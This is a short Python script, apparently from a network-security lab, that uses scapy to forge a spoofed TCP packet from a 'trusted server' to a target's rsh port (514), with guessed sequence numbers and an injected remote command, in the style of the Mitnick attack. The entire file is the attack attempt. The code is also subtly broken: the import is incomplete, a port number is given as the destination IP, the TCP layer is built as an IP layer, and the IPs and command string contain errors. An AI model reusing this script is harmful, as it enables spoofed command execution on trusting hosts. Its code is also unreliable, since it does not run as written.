from scapy.all import
import sys
x_terminal_ip ="10.9.0.5"
x_terminal_port = 514
trusted_server_ip = "10.0.9.6"
trusted_server_port = 1023
ip = IP(src=trusted_server_ip, dst=x_terminal_port)
tcp = IP(sport=9090,dport=x_terminal_port,flags="SA",seq=753451811,ack=1689764509)
if tcp.flags=="A":
    print("ACK packet established")
data ='9090\x00seed\x00dees\x00touch/temp/xyz\00'
pkt=ip/tcp/data
ls(pkt)